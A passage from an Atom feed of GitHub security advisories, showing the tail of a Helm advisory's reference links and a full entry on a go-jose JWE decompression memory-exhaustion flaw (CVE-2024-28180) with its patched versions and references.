<li><a href="https://github.com/helm/helm/security/advisories/GHSA-c38g-469g-cmgx">https://github.com/helm/helm/security/advisories/GHSA-c38g-469g-cmgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21303">https://nvd.nist.gov/vuln/detail/CVE-2021-21303</a></li>
<li><a href="https://github.com/helm/helm/commit/6ce9ba60b73013857e2e7c73d3f86ed70bc1ac9a">https://github.com/helm/helm/commit/6ce9ba60b73013857e2e7c73d3f86ed70bc1ac9a</a></li>
<li><a href="https://github.com/helm/helm/releases/tag/v3.5.2">https://github.com/helm/helm/releases/tag/v3.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-c38g-469g-cmgx">https://github.com/advisories/GHSA-c38g-469g-cmgx</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1040">https://pkg.go.dev/vuln/GO-2022-1040</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c38g-469g-cmgx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-06-23T18:14:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gopkg.in/square/go-jose.v2] Go JOSE vulnerable to Improper Handling of Highly Compressed Data (Data Amplification)]]></title>
        <id>https://github.com/advisories/GHSA-c5q2-7r4c-mv6g</id>
        <link href="https://github.com/advisories/GHSA-c5q2-7r4c-mv6g"/>
        <updated>2024-06-04T14:29:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.</p>
<h3 id="patches">Patches</h3>
<p>The problem is fixed in the following packages and versions:</p>
<ul>
<li>github.com/go-jose/go-jose/v4 version 4.0.1</li>
<li>github.com/go-jose/go-jose/v3 version 3.0.3</li>
<li>gopkg.in/go-jose/go-jose.v2 version 2.6.3</li>
</ul>
<p>The problem will not be fixed in the following package because the package is archived:</p>
<ul>
<li>gopkg.in/square/go-jose.v2</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-c5q2-7r4c-mv6g">https://github.com/go-jose/go-jose/security/advisories/GHSA-c5q2-7r4c-mv6g</a></li>
<li><a href="https://github.com/go-jose/go-jose/commit/0dd4dd541c665fb292d664f77604ba694726f298">https://github.com/go-jose/go-jose/commit/0dd4dd541c665fb292d664f77604ba694726f298</a></li>
<li><a href="https://github.com/go-jose/go-jose/commit/add6a284ea0f844fd6628cba637be5451fe4b28a">https://github.com/go-jose/go-jose/commit/add6a284ea0f844fd6628cba637be5451fe4b28a</a></li>
<li><a href="https://github.com/go-jose/go-jose/commit/f4c051a0653d78199a053892f7619ebf96339502">https://github.com/go-jose/go-jose/commit/f4c051a0653d78199a053892f7619ebf96339502</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28180">https://nvd.nist.gov/vuln/detail/CVE-2024-28180</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KXKGNCRU7OTM5AHC7YIYBNOWI742PRMY">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KXKGNCRU7OTM5AHC7YIYBNOWI742PRMY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XJDO5VSIAOGT2WP63AXAAWNRSVJCNCRH">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XJDO5VSIAOGT2WP63AXAAWNRSVJCNCRH</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/I6MMWFBOXJA6ZCXNVPDFJ4XMK5PVG5RG">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/I6MMWFBOXJA6ZCXNVPDFJ4XMK5PVG5RG</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UJO2U5ACZVACNQXJ5EBRFLFW6DP5BROY">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UJO2U5ACZVACNQXJ5EBRFLFW6DP5BROY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IJ6LAJJ2FTA2JVVOACCV5RZTOIZLXUNJ">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IJ6LAJJ2FTA2JVVOACCV5RZTOIZLXUNJ</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JNPMXL36YGS3GQEVI3Q5HKHJ7YAAQXL5">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JNPMXL36YGS3GQEVI3Q5HKHJ7YAAQXL5</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MSOMHDKRPU3A2JEMRODT2IREDFBLVPGS">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MSOMHDKRPU3A2JEMRODT2IREDFBLVPGS</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UG5FSEYJ3GP27FZXC5YAAMMEC5XWKJHG">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UG5FSEYJ3GP27FZXC5YAAMMEC5XWKJHG</a></li>
<li><a href="https://github.com/advisories/GHSA-c5q2-7r4c-mv6g">https://github.com/advisories/GHSA-c5q2-7r4c-mv6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c5q2-7r4c-mv6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-07T22:54:44.000Z</published>
    </entry>
</feed>